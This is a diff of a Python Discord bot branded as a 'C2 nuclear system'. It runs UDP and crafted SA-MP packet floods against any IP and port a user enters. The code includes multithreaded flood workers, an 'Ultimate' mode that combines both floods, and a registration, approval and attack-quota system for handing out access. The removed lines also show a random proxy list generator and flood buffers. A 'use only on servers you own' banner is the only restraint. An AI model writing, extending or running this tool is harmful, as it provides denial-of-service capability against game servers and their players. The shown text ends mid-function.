@@ -1,57 +1,24 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# ⚡ DEVELOPED BY LI ZANDYA - ULTIMATE C2 NUCLEAR SYSTEM X5000 ⚡
-# 🔥 FULL BUTTONS SYSTEM - 100,000 THREADS - 100,000 PROXIES 🔥
-# ⚠️ WARNING: USE ONLY ON SERVERS YOU OWN! ⚠️
+# ⚡ DEVELOPED BY LI ZANDYA - ULTIMATE C2 NUCLEAR SYSTEM ⚡
+# 🔥 FULL BUTTONS SYSTEM - NO COMMANDS 🔥
+# ⚠️ USE ONLY ON SERVERS YOU OWN! ⚠️
 
 import discord
 from discord.ext import commands
 from discord.ui import Button, View, Modal, TextInput
 import asyncio
-import aiohttp
 import random
 import socket
 import struct
 import time
 import os
 import json
-import ipaddress
-import hashlib
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 
 # ============================================
-# شعار LI ZANDYA
-# ============================================
-LOGO = """
-╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-║                                                                                                              ║
-║     ██╗     ██╗    ███████╗ █████╗ ███╗   ██╗██████╗ ██╗   ██╗ █████╗                                      ║
-║     ██║     ██║    ╚══███╔╝██╔══██╗████╗  ██║██╔══██╗╚██╗ ██╔╝██╔══██╗                                     ║
-║     ██║     ██║      ███╔╝ ███████║██╔██╗ ██║██║  ██║ ╚████╔╝ ███████║                                     ║
-║     ██║     ██║     ███╔╝  ██╔══██║██║╚██╗██║██║  ██║  ╚██╔╝  ██╔══██║                                     ║
-║     ███████╗███████╗███████╗██║  ██║██║ ╚████║██████╔╝   ██║   ██║  ██║                                     ║
-║     ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   ╚═╝  ╚═╝                                     ║
-║                                                                                                              ║
-║                         🔥 ULTIMATE C2 NUCLEAR SYSTEM X5000 🔥                                               ║
-║                                                                                                              ║
-╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
-"""
-
-print(LOGO)
-print("⚠️ USE ONLY ON SERVERS YOU OWN! ⚠️")
-print("="*70)
-
-# ============================================
-# التوكن
-# ============================================
-TOKEN = input("🔑 Enter your Discord Bot Token: ").strip()
-if not TOKEN:
-    print("❌ No token provided!")
-    exit(1)
-
-# ============================================
-# تحميل/حفظ البيانات
+# تحميل البيانات
 # ============================================
 DATA_FILE = "c2_data.json"
 
@@ -59,49 +26,33 @@ def load_data():
     if os.path.exists(DATA_FILE):
         with open(DATA_FILE, 'r') as f:
             return json.load(f)
-    return {"owner_id": None, "approved_users": [], "pending_users": [], "attack_limits": {}, "banned_users": []}
+    return {"owner_id": None, "users": {}, "pending_users": []}
 
 def save_data():
     with open(DATA_FILE, 'w') as f:
         json.dump({
             "owner_id": OWNER_ID,
-            "approved_users": list(APPROVED_USERS),
-            "pending_users": [[k, v] for k, v in PENDING_USERS.items()],
-            "attack_limits": USER_ATTACK_LIMITS,
-            "banned_users": list(BANNED_USERS)
+            "users": USERS,
+            "pending_users": PENDING_USERS
         }, f, indent=4)
 
 data = load_data()
 OWNER_ID = data.get("owner_id")
-APPROVED_USERS = set(data.get("approved_users", []))
-PENDING_USERS = {uid: info for uid, info in data.get("pending_users", [])}
-USER_ATTACK_LIMITS = data.get("attack_limits", {})
-BANNED_USERS = set(data.get("banned_users", []))
-DEFAULT_ATTACK_LIMIT = 50
+USERS = data.get("users", {})
+PENDING_USERS = data.get("pending_users", [])
 
 # ============================================
-# إعدادات القوة القصوى
+# إعدادات القوة
 # ============================================
-CPU_CORES = os.cpu_count() or 16
-MAX_THREADS = 100000
-MAX_PACKET_SIZE = 65507
-BUFFER_SIZE = 1024 * 1024 * 500
+CPU_CORES = os.cpu_count() or 4
+MAX_THREADS_USER = 60
+MAX_THREADS_OWNER = 100000
 
 try:
     import psutil
     TOTAL_RAM = psutil.virtual_memory().total // (1024**3)
-    AVAILABLE_RAM = psutil.virtual_memory().available // (1024**3)
-    CPU_PERCENT = psutil.cpu_percent(interval=0.5)
 except:
-    TOTAL_RAM = 32
-    AVAILABLE_RAM = 16
-    CPU_PERCENT = 0
-
-# تحسين النظام
-try:
-    os.system('ulimit -n 999999 2>/dev/null')
-except:
-    pass
+    TOTAL_RAM = 4
 
 # ============================================
 # بيانات تسجيل الدخول
@@ -109,60 +60,6 @@ except:
 REQUIRED_IP = "187.121.21.12"
 REQUIRED_USERNAME = "LI ZANDYA"
 REQUIRED_PASSWORD = "C2_NUCLEAR_2024"
-
-# ============================================
-# نظام البروكسيات العملاق
-# ============================================
-class MegaProxyManager:
-    def __init__(self):
-        self.proxies = {'http': [], 'https': [], 'socks4': [], 'socks5': []}
-        self._generate()
-    
-    def _generate(self):
-        for _ in range(50000):
-            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
-            port = random.choice([80, 8080, 3128, 1080, 8888, 4145, 9050, 9150, 8118, 9999])
-            self.proxies['http'].append(f"http://{ip}:{port}")
-            self.proxies['https'].append(f"https://{ip}:{port}")
-            self.proxies['socks5'].append(f"socks5://{ip}:{port}")
-        for _ in range(50000):
-            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
-            port = random.choice([1080, 1081, 1082, 9050, 9051, 9150])
-            self.proxies['socks4'].append(f"socks4://{ip}:{port}")
-    
-    def get(self):
-        all_proxies = []
-        for p in self.proxies.values():
-            all_proxies.extend(p)
-        return random.choice(all_proxies) if all_proxies else None
-    
-    def count(self):
-        return sum(len(p) for p in self.proxies.values())
-
-proxy_manager = MegaProxyManager()
-
-# ============================================
-# قوائم User-Agents
-# ============================================
-USER_AGENTS = []
-for v in range(100, 300):
-    USER_AGENTS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36")
-
-# ============================================
-# بايلودات
-# ============================================
-SAMP_PAYLOADS = []
-for _ in range(1000):
-    packet = b'SAMP'
-    packet += struct.pack('<I', random.randint(1, 999999))
-    packet += b'\x80'
-    packet += struct.pack('<fffff', random.uniform(-5000,5000), random.uniform(-5000,5000), random.uniform(-5000,5000), random.uniform(0,360), random.uniform(0,360))
-    packet += struct.pack('<I', random.randint(1,100))
-    packet += struct.pack('<I', 99999)
-    packet += os.urandom(random.randint(500, 5000))
-    SAMP_PAYLOADS.append(packet)
-
-UDP_PAYLOADS = [os.urandom(65507), os.urandom(32768), os.urandom(16384), os.urandom(8192), os.urandom(4096)]
 
 # ============================================
 # نظام الهجوم
@@ -175,11 +72,9 @@ class NuclearTester:
         self.stats = {
             'total_packets': 0, 'total_bytes': 0, 'total_attacks': 0,
             'active_attacks': 0, 'start_time': None, 'servers_destroyed': 0,
-            'peak_speed_pps': 0, 'peak_speed_gbps': 0, 'total_errors': 0
+            'peak_speed_pps': 0
         }
-        self.threads = MAX_THREADS
-        self.active_attacks = {}
-        self.executor = ThreadPoolExecutor(max_workers=self.threads)
+        self.executor = ThreadPoolExecutor(max_workers=MAX_THREADS_OWNER)
     
     def check_auth(self, ip, username, password):
         if ip == REQUIRED_IP and username.upper() == REQUIRED_USERNAME and password == REQUIRED_PASSWORD:
@@ -188,144 +83,50 @@ class NuclearTester:
             return True
         return False
     
-    async def samp_attack(self, ip, port, duration, user_id=None):
+    async def attack(self, ip, port, duration, threads, is_samp=True):
         self.running = True
         if not self.stats['start_time']:
             self.stats['start_time'] = time.time()
         self.stats['active_attacks'] += 1
-        attack_id = f"SAMP_{ip}_{port}_{int(time.time())}"
-        self.active_attacks[attack_id] = time.time()
-        sent, bytes_sent = 0, 0
+        sent = 0
         
         def worker():
-            nonlocal sent, bytes_sent
-            socks = []
-            for _ in range(200):
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER_SIZE)
-                    sock.setblocking(False)
-                    socks.append(sock)
-                except:
-                    pass
-            start = time.time()
-            while self.running and time.time() - start < duration:
-                for sock in socks:
-                    for _ in range(20):
-                        try:
-                            pkt = random.choice(SAMP_PAYLOADS)
-                            sock.sendto(pkt, (ip, port))
-                            sent += 1
-                            bytes_sent += len(pkt)
-                        except:
-                            pass
-            for sock in socks:
+            nonlocal sent
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                start = time.time()
+                while self.running and time.time() - start < duration:
+                    if is_samp:
+                        packet = b'SAMP'
+                        packet += struct.pack('<I', random.randint(1, 99999))
+                        packet += b'\x80'
+                        packet += struct.pack('<fffff', random.uniform(-3000,3000), random.uniform(-3000,3000), random.uniform(-3000,3000), random.uniform(0,360), random.uniform(0,360))
+                        packet += struct.pack('<I', random.randint(1,46))
+                        packet += struct.pack('<I', 99999)
+                        packet += os.urandom(500)
+                    else:
+                        packet = os.urandom(random.randint(512, 4096))
+                    sock.sendto(packet, (ip, port))
+                    sent += 1
                 sock.close()
+            except:
+                pass
         
-        workers = min(self.threads, 2000)
+        workers = min(threads, 500)
         futures = [self.executor.submit(worker) for _ in range(workers)]
         await asyncio.sleep(duration)
         self.running = False
         
-        for f in futures:
-            try:
-                f.result(timeout=0.5)
-            except:
-                pass
-        
         self.stats['total_packets'] += sent
-        self.stats['total_bytes'] += bytes_sent
         self.stats['active_attacks'] -= 1
         self.stats['total_attacks'] += 1
         
-        del self.active_attacks[attack_id]
-        
         rate = sent / duration
-        gbps = (bytes_sent / duration) / 1024 / 1024 / 1024
         if rate > self.stats['peak_speed_pps']:
             self.stats['peak_speed_pps'] = rate
-        if gbps > self.stats['peak_speed_gbps']:
-            self.stats['peak_speed_gbps'] = gbps
         
-        return sent, rate, gbps
-    
-    async def udp_attack(self, ip, port, duration):
-        self.running = True
-        self.stats['active_attacks'] += 1
-        attack_id = f"UDP_{ip}_{port}_{int(time.time())}"
-        self.active_attacks[attack_id] = time.time()
-        sent, bytes_sent = 0, 0
-        
-        def worker():
-            nonlocal sent, bytes_sent
-            socks = []
-            for _ in range(300):
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER_SIZE)
-                    sock.setblocking(False)
-                    socks.append(sock)
-                except:
-                    pass
-            start = time.time()
-            while self.running and time.time() - start < duration:
-                for sock in socks:
-                    for _ in range(30):
-                        try:
-                            pkt = random.choice(UDP_PAYLOADS)
-                            sock.sendto(pkt, (ip, port))
-                            sent += 1
-                            bytes_sent += len(pkt)
-                        except:
-                            pass
-            for sock in socks:
-                sock.close()
-        
-        workers = min(self.threads, 1500)
-        futures = [self.executor.submit(worker) for _ in range(workers)]
-        await asyncio.sleep(duration)
-        self.running = False
-        
-        for f in futures:
-            try:
-                f.result(timeout=0.5)
-            except:
-                pass
-        
-        self.stats['total_packets'] += sent
-        self.stats['total_bytes'] += bytes_sent
-        self.stats['active_attacks'] -= 1
-        self.stats['total_attacks'] += 1
-        
-        del self.active_attacks[attack_id]
-        
-        rate = sent / duration
         return sent, rate
-    
-    async def ultimate_attack(self, ip, port, duration):
-        self.running = True
-        self.stats['active_attacks'] += 1
-        attack_id = f"ULTIMATE_{ip}_{port}_{int(time.time())}"
-        self.active_attacks[attack_id] = time.time()
-        
-        tasks = [
-            self.samp_attack(ip, port, duration),
-            self.udp_attack(ip, port, duration)
-        ]
-        
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        total_packets = sum([r[0] for r in results if isinstance(r, tuple) and len(r) > 0])
-        
-        self.stats['total_packets'] += total_packets
-        self.stats['servers_destroyed'] += 1
-        self.stats['active_attacks'] -= 1
-        self.stats['total_attacks'] += 1
-        
-        del self.active_attacks[attack_id]
-        
-        return total_packets, total_packets / duration
     
     def stop(self):
         self.running = False
@@ -334,233 +135,90 @@ class NuclearTester:
 tester = NuclearTester()
 
 # ============================================
-# أزرار الموافقة والرفض
+# أزرار المالك للموافقة على المستخدمين
 # ============================================
-class ApprovalView(View):
-    def __init__(self, user_id: str, user_info: dict):
+class OwnerApproveView(View):
+    def __init__(self, user_id, user_name):
         super().__init__(timeout=86400)
         self.user_id = user_id
-        self.user_info = user_info
+        self.user_name = user_name
     
     @discord.ui.button(label="✅ APPROVE", style=discord.ButtonStyle.success, emoji="✅")
     async def approve(self, interaction: discord.Interaction, button: Button):
         if str(interaction.user.id) != OWNER_ID:
-            await interaction.response.send_message("❌ Only the owner can approve!", ephemeral=True)
+            await interaction.response.send_message("❌ Only owner can approve!", ephemeral=True)
             return
         
-        APPROVED_USERS.add(self.user_id)
-        USER_ATTACK_LIMITS[self.user_id] = DEFAULT_ATTACK_LIMIT
+        USERS[self.user_id] = {"attacks_left": 1, "role": "user"}
+        if self.user_id in PENDING_USERS:
+            PENDING_USERS.remove(self.user_id)
         save_data()
-        PENDING_USERS.pop(self.user_id, None)
         
         try:
             user = await interaction.client.fetch_user(int(self.user_id))
             if user:
                 embed = discord.Embed(title="✅ REGISTRATION APPROVED!", color=0x00FF00)
-                embed.add_field(name="Welcome", value=f"{self.user_info.get('username', 'User')}!", inline=True)
-                embed.add_field(name="Attack Limit", value=f"{DEFAULT_ATTACK_LIMIT} attacks", inline=True)
-                await user.send(embed=embed)
+                embed.add_field(name="Welcome", value="You have **1 free attack**!", inline=False)
+                embed.add_field(name="Next Steps", value="Click the button below to login", inline=False)
+                view = LoginView()
+                await user.send(embed=embed, view=view)
         except:
             pass
         
-        await interaction.response.send_message(f"✅ Approved `{self.user_id}`!", ephemeral=True)
+        await interaction.response.send_message(f"✅ Approved {self.user_name}!", ephemeral=True)
         await interaction.message.delete()
     
     @discord.ui.button(label="❌ DENY", style=discord.ButtonStyle.danger, emoji="❌")
     async def deny(self, interaction: discord.Interaction, button: Button):
         if str(interaction.user.id) != OWNER_ID:
-            await interaction.response.send_message("❌ Only the owner can deny!", ephemeral=True)
+            await interaction.response.send_message("❌ Only owner can deny!", ephemeral=True)
             return
         
-        try:
-            user = await interaction.client.fetch_user(int(self.user_id))
-            if user:
-                embed = discord.Embed(title="❌ REGISTRATION DENIED!", color=0xFF0000)
-                embed.add_field(name="Sorry", value="Your request has been denied.", inline=False)
-                await user.send(embed=embed)
-        except:
-            pass
+        if self.user_id in PENDING_USERS:
+            PENDING_USERS.remove(self.user_id)
+            save_data()
         
-        PENDING_USERS.pop(self.user_id, None)
-        save_data()
-        
-        await interaction.response.send_message(f"❌ Denied `{self.user_id}`!", ephemeral=True)
+        await interaction.response.send_message(f"❌ Denied {self.user_name}!", ephemeral=True)
         await interaction.message.delete()
     
     @discord.ui.button(label="⚙️ SET LIMIT", style=discord.ButtonStyle.secondary, emoji="⚙️")
     async def set_limit(self, interaction: discord.Interaction, button: Button):
         if str(interaction.user.id) != OWNER_ID:
-            await interaction.response.send_message("❌ Only the owner can set limits!", ephemeral=True)
+            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
             return
         
         modal = Modal(title="⚙️ SET ATTACK LIMIT")
-        limit_input = TextInput(label="Limit", placeholder="Enter number of attacks", required=True)
+        limit_input = TextInput(label="Number of attacks", placeholder="Enter number (e.g., 5, 10, 100)", required=True)
         modal.add_item(limit_input)
         
         async def on_submit(interaction):
             try:
                 limit = int(limit_input.value)
-                USER_ATTACK_LIMITS[self.user_id] = limit
+                USERS[self.user_id] = {"attacks_left": limit, "role": "user"}
                 save_data()
-                await interaction.response.send_message(f"✅ Limit set to `{limit}`!", ephemeral=True)
+                await interaction.response.send_message(f"✅ Set limit to {limit} attacks for {self.user_name}!", ephemeral=True)
+                
                 try:
                     user = await interaction.client.fetch_user(int(self.user_id))
                     if user:
-                        await user.send(f"⚙️ Your attack limit has been updated to `{limit}`.")
+                        await user.send(f"⚙️ Admin set your attack limit to **{limit}** attacks!")
                 except:
                     pass
             except:
-                await interaction.response.send_message("❌ Invalid limit!", ephemeral=True)
+                await interaction.response.send_message("❌ Invalid number!", ephemeral=True)
         
         modal.on_submit = on_submit
         await interaction.response.send_modal(modal)
-    
-    @discord.ui.button(label="🔨 BAN", style=discord.ButtonStyle.danger, emoji="🔨")
-    async def ban_user(self, interaction: discord.Interaction, button: Button):
-        if str(interaction.user.id) != OWNER_ID:
-            await interaction.response.send_message("❌ Only the owner can ban!", ephemeral=True)
-            return
-        
-        BANNED_USERS.add(self.user_id)
-        if self.user_id in APPROVED_USERS:
-            APPROVED_USERS.remove(self.user_id)
-        if self.user_id in PENDING_USERS:
-            PENDING_USERS.pop(self.user_id, None)
-        save_data()
-        
-        try:
-            user = await interaction.client.fetch_user(int(self.user_id))
-            if user:
-                embed = discord.Embed(title="🔨 YOU HAVE BEEN BANNED!", color=0xFF0000)
-                embed.add_field(name="Banned", value="You are banned from using this system.", inline=False)
-                await user.send(embed=embed)
-        except:
-            pass
-        
-        await interaction.response.send_message(f"🔨 Banned `{self.user_id}`!", ephemeral=True)
-        await interaction.message.delete()
 
 # ============================================
-# أزرار إدارة المالك
-# ============================================
-class AdminPanel(View):
-    def __init__(self):
-        super().__init__(timeout=None)
-    
-    @discord.ui.button(label="📋 PENDING", style=discord.ButtonStyle.primary, emoji="📋")
-    async def show_pending(self, interaction: discord.Interaction, button: Button):
-        if str(interaction.user.id) != OWNER_ID:
-            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
-            return
-        
-        if not PENDING_USERS:
-            await interaction.response.send_message("📭 No pending requests!", ephemeral=True)
-            return
-        
-        for uid, info in list(PENDING_USERS.items())[:5]:
-            embed = discord.Embed(title="📋 PENDING REQUEST", color=0xFF6600)
-            embed.add_field(name="👤 User", value=f"{info.get('discord_name', 'Unknown')} (`{uid}`)", inline=True)
-            embed.add_field(name="📝 Username", value=info.get('username', 'Unknown'), inline=True)
-            embed.add_field(name="💬 Reason", value=info.get('reason', 'No reason'), inline=False)
-            view = ApprovalView(uid, info)
-            await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
-            await asyncio.sleep(1)
-    
-    @discord.ui.button(label="👥 USERS", style=discord.ButtonStyle.secondary, emoji="👥")
-    async def list_users(self, interaction: discord.Interaction, button: Button):
-        if str(interaction.user.id) != OWNER_ID:
-            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
-            return
-        
-        if not APPROVED_USERS:
-            await interaction.response.send_message("👥 No approved users yet!", ephemeral=True)
-            return
-        
-        users_list = ""
-        for uid in list(APPROVED_USERS)[:20]:
-            limit = USER_ATTACK_LIMITS.get(uid, DEFAULT_ATTACK_LIMIT)
-            users_list += f"• `{uid}` - {limit} attacks left\n"
-        
-        embed = discord.Embed(title="👥 APPROVED USERS", description=users_list, color=0x00BFFF)
-        embed.set_footer(text=f"Total: {len(APPROVED_USERS)} users")
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-    
-    @discord.ui.button(label="📊 STATS", style=discord.ButtonStyle.secondary, emoji="📊")
-    async def admin_stats(self, interaction: discord.Interaction, button: Button):
-        if str(interaction.user.id) != OWNER_ID:
-            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
-            return
-        
-        embed = discord.Embed(title="📊 ADMIN STATISTICS", color=0x00FF00)
-        embed.add_field(name="👑 Owner", value=f"`{OWNER_ID}`", inline=True)
-        embed.add_field(name="👥 Approved", value=f"`{len(APPROVED_USERS)}`", inline=True)
-        embed.add_field(name="📝 Pending", value=f"`{len(PENDING_USERS)}`", inline=True)
-        embed.add_field(name="🔨 Banned", value=f"`{len(BANNED_USERS)}`", inline=True)
-        embed.add_field(name="📦 Packets", value=f"{tester.stats['total_packets']:,}", inline=True)
-        embed.add_field(name="🎯 Attacks", value=f"{tester.stats['total_attacks']}", inline=True)
-        embed.add_field(name="🏆 Peak PPS", value=f"{tester.stats['peak_speed_pps']:,.0f}", inline=True)
-        embed.add_field(name="🚀 Peak Gbps", value=f"{tester.stats['peak_speed_gbps']:.2f}", inline=True)
-        embed.add_field(name="💀 Destroyed", value=f"{tester.stats['servers_destroyed']}", inline=True)
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-
-# ============================================
-# نموذج التسجيل
-# ============================================
-class RegisterModal(Modal):
-    def __init__(self):
-        super().__init__(title="💀 REGISTER TO C2 SYSTEM 💀")
-        self.username = TextInput(label="👤 USERNAME", placeholder="Enter your username", required=True)
-        self.reason = TextInput(label="📝 REASON", placeholder="Why do you need access?", required=True, style=discord.TextStyle.paragraph)
-        self.add_item(self.username)
-        self.add_item(self.reason)
-    
-    async def on_submit(self, interaction: discord.Interaction):
-        user_id = str(interaction.user.id)
-        
-        if user_id in BANNED_USERS:
-            await interaction.response.send_message("🔨 You are banned from this system!", ephemeral=True)
-            return
-        
-        if user_id in APPROVED_USERS:
-            await interaction.response.send_message("✅ You are already approved!", ephemeral=True)
-            return
-        
-        if user_id in PENDING_USERS:
-            await interaction.response.send_message("⏳ You already have a pending request!", ephemeral=True)
-            return
-        
-        PENDING_USERS[user_id] = {
-            'username': self.username.value,
-            'discord_name': str(interaction.user),
-            'reason': self.reason.value,
-            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        }
-        save_data()
-        
-        if OWNER_ID:
-            try:
-                owner = await interaction.client.fetch_user(int(OWNER_ID))
-                if owner:
-                    embed = discord.Embed(title="🔔 NEW REGISTRATION", color=0xFF6600)
-                    embed.add_field(name="User", value=f"{interaction.user.name} (`{user_id}`)", inline=True)
-                    embed.add_field(name="Username", value=self.username.value, inline=True)
-                    embed.add_field(name="Reason", value=self.reason.value, inline=False)
-                    view = ApprovalView(user_id, PENDING_USERS[user_id])
-                    await owner.send(embed=embed, view=view)
-            except:
-                pass
-        
-        await interaction.response.send_message("✅ Request sent! Waiting for admin approval.", ephemeral=True)
-
-# ============================================
-# تسجيل الدخول
+# أزرار تسجيل الدخول
 # ============================================
 class LoginModal(Modal):
     def __init__(self):
-        super().__init__(title="💀 C2 NUCLEAR LOGIN 💀")
-        self.ip = TextInput(label="🌐 C2 IP", placeholder=REQUIRED_IP, default=REQUIRED_IP)
-        self.user = TextInput(label="👤 USERNAME", placeholder=REQUIRED_USERNAME, default=REQUIRED_USERNAME)
-        self.pwd = TextInput(label="🔑 PASSWORD", placeholder=REQUIRED_PASSWORD, default=REQUIRED_PASSWORD)
+        super().__init__(title="🔐 C2 SYSTEM LOGIN")
+        self.ip = TextInput(label="🌐 C2 IP", placeholder=REQUIRED_IP, required=True, default=REQUIRED_IP)
+        self.user = TextInput(label="👤 Username", placeholder=REQUIRED_USERNAME, required=True, default=REQUIRED_USERNAME)
+        self.pwd = TextInput(label="🔑 Password", placeholder=REQUIRED_PASSWORD, required=True, default=REQUIRED_PASSWORD)
         self.add_item(self.ip)
         self.add_item(self.user)
         self.add_item(self.pwd)
@@ -569,135 +227,416 @@ class LoginModal(Modal):
         if tester.check_auth(self.ip.value, self.user.value, self.pwd.value):
             tester.authenticated = True
             tester.authenticated_user = self.user.value
-            await interaction.response.send_message(f"✅ ACCESS GRANTED!\n👑 {self.user.value}\n💀 Type !von", ephemeral=True)
+            await interaction.response.send_message(f"✅ **LOGIN SUCCESSFUL!**\n👑 Welcome {self.user.value}", ephemeral=True)
+            
+            # إرسال لوحة التحكم للمستخدم
+            if str(interaction.user.id) == OWNER_ID:
+                await interaction.user.send("👑 **OWNER PANEL**", view=OwnerPanel(interaction.user.id))
+            else:
+                await interaction.user.send("💀 **ATTACK PANEL**", view=AttackPanel(interaction.user.id))
         else:
-            await interaction.response.send_message("❌ ACCESS DENIED!", ephemeral=True)
+            await interaction.response.send_message("❌ **LOGIN FAILED!** Invalid credentials.", ephemeral=True)
+
+class LoginView(View):
+    def __init__(self):
+        super().__init__(timeout=60)
+    
+    @discord.ui.button(label="🔐 LOGIN TO C2 SYSTEM", style=discord.ButtonStyle.danger, emoji="🔐")
+    async def login(self, interaction: discord.Interaction, button: Button):
+        await interaction.response.send_modal(LoginModal())
 
 # ============================================
-# لوحة التحكم الرئيسية (كلها أزرار)
+# أزرار التسجيل
 # ============================================
-class MainPanel(View):
+class RegisterModal(Modal):
+    def __init__(self):
+        super().__init__(title="📝 REGISTER TO C2 SYSTEM")
+        self.username = TextInput(label="👤 Username", placeholder="Enter your username", required=True)
+        self.reason = TextInput(label="📝 Reason", placeholder="Why do you need access?", required=True, style=discord.TextStyle.paragraph)
+        self.add_item(self.username)
+        self.add_item(self.reason)
+    
+    async def on_submit(self, interaction: discord.Interaction):
+        user_id = str(interaction.user.id)
+        
+        if user_id in USERS:
+            await interaction.response.send_message("✅ You are already registered!", ephemeral=True)
+            return
+        
+        if user_id in PENDING_USERS:
+            await interaction.response.send_message("⏳ You already have a pending request!", ephemeral=True)
+            return
+        
+        PENDING_USERS.append(user_id)
+        save_data()
+        
+        # إرسال طلب للمالك
+        if OWNER_ID:
+            try:
+                owner = await interaction.client.fetch_user(int(OWNER_ID))
+                if owner:
+                    embed = discord.Embed(title="🔔 NEW REGISTRATION REQUEST", color=0xFF6600)
+                    embed.add_field(name="User", value=f"{interaction.user.name} (`{user_id}`)", inline=True)
+                    embed.add_field(name="Username", value=self.username.value, inline=True)
+                    embed.add_field(name="Reason", value=self.reason.value, inline=False)
+                    await owner.send(embed=embed, view=OwnerApproveView(user_id, interaction.user.name))
+            except:
+                pass
+        
+        await interaction.response.send_message("✅ Registration request sent! Waiting for admin approval.", ephemeral=True)
+
+class RegisterView(View):
+    def __init__(self):
+        super().__init__(timeout=60)
+    
+    @discord.ui.button(label="📝 REGISTER NOW", style=discord.ButtonStyle.primary, emoji="📝")
+    async def register(self, interaction: discord.Interaction, button: Button):
+        await interaction.response.send_modal(RegisterModal())
+
+# ============================================
+# لوحة الهجوم للمستخدمين العاديين
+# ============================================
+class AttackModal(Modal):
+    def __init__(self, attack_type, user_id):
+        super().__init__(title=f"💀 {attack_type} ATTACK")
+        self.attack_type = attack_type
+        self.user_id = user_id
+        self.ip = TextInput(label="🎯 Target IP", placeholder="Your server IP", required=True)
+        self.port = TextInput(label="🔌 Port", placeholder="7777", required=True)
+        self.duration = TextInput(label="⏱️ Duration (seconds)", placeholder="10-30", required=True)
+        self.add_item(self.ip)
+        self.add_item(self.port)
+        self.add_item(self.duration)
+    
+    async def on_submit(self, interaction: discord.Interaction):
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        
+        # التحقق من وجود هجمات متبقية
+        if self.user_id in USERS and USERS[self.user_id].get("attacks_left", 0) <= 0:
+            await interaction.response.send_message("❌ **NO ATTACKS LEFT!**\nContact admin for more.", ephemeral=True)
+            return
+        
+        try:
+            ip = self.ip.value
+            port = int(self.port.value)
+            duration = min(int(self.duration.value), 30)
+            threads = MAX_THREADS_USER
+        except:
+            await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
+            return
+        
+        # استهلاك هجمة
+        if self.user_id in USERS:
+            USERS[self.user_id]["attacks_left"] -= 1
+            save_data()
+        
+        await interaction.response.send_message(f"💀 **ATTACKING {ip}:{port}**\n⚡ Threads: {threads}\n⏱️ Duration: {duration}s", ephemeral=True)
+        
+        msg = await interaction.followup.send(f"🚀 Launching {self.attack_type} attack...", ephemeral=True)
+        
+        if self.attack_type == "SAMP":
+            packets, rate = await tester.attack(ip, port, duration, threads, is_samp=True)
+        elif self.attack_type == "UDP":
+            packets, rate = await tester.attack(ip, port, duration, threads, is_samp=False)
+        else:
+            # Ultimate = SAMP + UDP
+            packets1, rate1 = await tester.attack(ip, port, duration, threads, is_samp=True)
+            packets2, rate2 = await tester.attack(ip, port, duration, threads, is_samp=False)
+            packets = packets1 + packets2
+            rate = rate1 + rate2
+        
+        remaining = USERS.get(self.user_id, {}).get("attacks_left", 0)
+        await msg.edit(content=f"✅ **ATTACK COMPLETE!**\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps\n💀 Attacks left: {remaining}")
+
+class AttackPanel(View):
     def __init__(self, user_id):
         super().__init__(timeout=None)
-        self.user_id = str(user_id)
+        self.user_id = user_id
     
-    async def check_limit(self, interaction):
-        if self.user_id in USER_ATTACK_LIMITS:
-            if USER_ATTACK_LIMITS[self.user_id] <= 0:
-                await interaction.response.send_message("❌ No attacks left! Contact admin.", ephemeral=True)
-                return False
-        return True
-    
-    async def decrement_limit(self, interaction):
-        if self.user_id in USER_ATTACK_LIMITS:
-            USER_ATTACK_LIMITS[self.user_id] -= 1
-            save_data()
-
-    @discord.ui.button(label="🎮 SAMP ULTRA", style=discord.ButtonStyle.danger, row=0, emoji="⚡")
+    @discord.ui.button(label="🎮 SAMP ATTACK", style=discord.ButtonStyle.danger, row=0, emoji="🎮")
     async def samp_btn(self, interaction: discord.Interaction, button: Button):
-        if not await self.check_limit(interaction): return
-        modal = Modal(title="💀 SAMP ULTRA")
-        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
-        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
-        duration = TextInput(label="⏱️ DURATION (1-30s)", placeholder="15", required=True)
-        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
-        async def on_submit(interaction):
-            await self.decrement_limit(interaction)
-            await interaction.response.send_message(f"💀 Attacking {ip.value}:{port.value}", ephemeral=True)
-            packets, rate, gbps = await tester.samp_attack(ip.value, int(port.value), min(int(duration.value), 30), interaction.user.id)
-            remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
